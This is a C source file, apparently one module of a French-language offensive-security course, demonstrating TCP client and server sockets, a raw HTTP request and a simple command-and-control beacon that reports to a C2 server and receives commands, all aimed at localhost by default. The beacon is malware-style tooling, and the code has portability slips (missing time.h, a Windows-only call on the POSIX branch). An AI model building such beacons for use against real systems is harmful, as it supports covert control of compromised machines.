/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                    MODULE 27 : NETWORKING & SOCKETS
 * ═══════════════════════════════════════════════════════════════════════════
 * AVERTISSEMENT : Tests uniquement sur réseaux/systèmes autorisés
 * ═══════════════════════════════════════════════════════════════════════════
 */

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
#endif

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *              TECHNIQUE 1 : TCP CLIENT/SERVER
 * ═══════════════════════════════════════════════════════════════════════════
 */

#ifdef _WIN32
BOOL init_winsock(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup échoué: %d\n", WSAGetLastError());
        return FALSE;
    }
    printf("[+] Winsock initialisé\n");
    return TRUE;
}

void cleanup_winsock(void) {
    WSACleanup();
}
#else
#define init_winsock() (TRUE)
#define cleanup_winsock()
#endif

void tcp_server_demo(int port) {
    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    TCP SERVER\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);
    char buffer[1024];

    // Créer le socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("[-] Création du socket échouée\n");
        return;
    }
    printf("[+] Socket créé\n");

    // Configurer l'adresse
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    // Bind
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("[-] Bind échoué\n");
        closesocket(server_socket);
        return;
    }
    printf("[+] Bind sur le port %d\n", port);

    // Listen
    if (listen(server_socket, 3) == SOCKET_ERROR) {
        printf("[-] Listen échoué\n");
        closesocket(server_socket);
        return;
    }
    printf("[+] En écoute...\n");

    // Accept
    printf("[*] En attente de connexion...\n");
    client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
    if (client_socket == INVALID_SOCKET) {
        printf("[-] Accept échoué\n");
    } else {
        printf("[+] Client connecté: %s:%d\n",
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        // Recevoir des données
        int recv_size = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (recv_size > 0) {
            buffer[recv_size] = '\0';
            printf("[+] Reçu: %s\n", buffer);

            // Répondre
            char* response = "Message reçu!";
            send(client_socket, response, strlen(response), 0);
        }

        closesocket(client_socket);
    }

    closesocket(server_socket);
}

void tcp_client_demo(const char* server_ip, int port) {
    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    TCP CLIENT\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    SOCKET client_socket;
    struct sockaddr_in server_addr;
    char buffer[1024];

    // Créer le socket
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET) {
        printf("[-] Création du socket échouée\n");
        return;
    }

    // Configurer l'adresse du serveur
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    printf("[*] Connexion à %s:%d...\n", server_ip, port);

    // Connecter
    if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("[-] Connexion échouée\n");
        closesocket(client_socket);
        return;
    }
    printf("[+] Connecté!\n");

    // Envoyer des données
    char* message = "Bonjour du client TCP!";
    send(client_socket, message, strlen(message), 0);
    printf("[+] Message envoyé: %s\n", message);

    // Recevoir la réponse
    int recv_size = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (recv_size > 0) {
        buffer[recv_size] = '\0';
        printf("[+] Réponse: %s\n", buffer);
    }

    closesocket(client_socket);
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *              TECHNIQUE 2 : HTTP REQUEST SIMPLE
 * ═══════════════════════════════════════════════════════════════════════════
 */

void http_request_demo(const char* host, const char* path) {
    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    HTTP REQUEST\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    SOCKET sock;
    struct sockaddr_in server;
    char request[1024];
    char response[4096];

    // Créer le socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;

    // Résoudre l'hôte (simplification: utiliser directement l'IP ou localhost)
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    server.sin_addr.s_addr = inet_addr(host);

    printf("[*] Connexion à %s...\n", host);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("[-] Connexion échouée\n");
        closesocket(sock);
        return;
    }

    // Construire la requête HTTP
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, host);

    printf("[+] Envoi de la requête HTTP...\n");
    send(sock, request, strlen(request), 0);

    // Recevoir la réponse
    printf("\n[+] Réponse:\n");
    printf("─────────────────────────────────────────────────────────────\n");
    int bytes;
    while ((bytes = recv(sock, response, sizeof(response) - 1, 0)) > 0) {
        response[bytes] = '\0';
        printf("%s", response);
    }
    printf("\n─────────────────────────────────────────────────────────────\n");

    closesocket(sock);
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *              TECHNIQUE 3 : C2 BEACON SIMPLE
 * ═══════════════════════════════════════════════════════════════════════════
 */

void c2_beacon_demo(const char* c2_server, int port, int interval) {
    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("    C2 BEACON (Démo)\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    printf("[*] Serveur C2: %s:%d\n", c2_server, port);
    printf("[*] Intervalle: %d secondes\n", interval);
    printf("[*] Envoi de 3 beacons pour la démo...\n\n");

    for (int i = 0; i < 3; i++) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server;

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(c2_server);

        printf("[%d] Beacon %d...\n", (int)time(NULL), i + 1);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            // Envoyer les infos système
            char beacon[512];
            snprintf(beacon, sizeof(beacon),
                     "BEACON|%s|%lu|%d",
                     "HOSTNAME", GetCurrentProcessId(), i);

            send(sock, beacon, strlen(beacon), 0);
            printf("    [+] Beacon envoyé\n");

            // Recevoir des commandes (timeout court pour démo)
            char cmd[256];
            int recv_size = recv(sock, cmd, sizeof(cmd) - 1, 0);
            if (recv_size > 0) {
                cmd[recv_size] = '\0';
                printf("    [+] Commande reçue: %s\n", cmd);
            }

            closesocket(sock);
        } else {
            printf("    [-] Connexion échouée\n");
        }

#ifdef _WIN32
        Sleep(interval * 1000);
#else
        sleep(interval);
#endif
    }

    printf("\n[*] Démo beacon terminée\n");
}

/*
 * ═══════════════════════════════════════════════════════════════════════════
 *                         DÉMONSTRATIONS
 * ═══════════════════════════════════════════════════════════════════════════
 */

void demo_networking(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║       MODULE 27 : DÉMONSTRATION NETWORKING & SOCKETS         ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    if (!init_winsock()) {
        return;
    }

    printf("\n[*] Sélectionnez la démo:\n");
    printf("1. TCP Server (écoute)\n");
    printf("2. TCP Client (connexion)\n");
    printf("3. HTTP Request\n");
    printf("4. C2 Beacon\n");
    printf("Choix (1-4): ");

    int choice;
    if (scanf("%d", &choice) != 1) {
        cleanup_winsock();
        return;
    }

    switch (choice) {
        case 1:
            tcp_server_demo(4444);
            break;
        case 2: {
            char ip[64];
            printf("IP du serveur: ");
            scanf("%63s", ip);
            tcp_client_demo(ip, 4444);
            break;
        }
        case 3:
            printf("[*] Démo HTTP sur localhost (127.0.0.1)\n");
            http_request_demo("127.0.0.1", "/");
            break;
        case 4:
            c2_beacon_demo("127.0.0.1", 8080, 5);
            break;
        default:
            printf("[-] Choix invalide\n");
    }

    cleanup_winsock();
}

int main(void) {
    demo_networking();
    return 0;
}
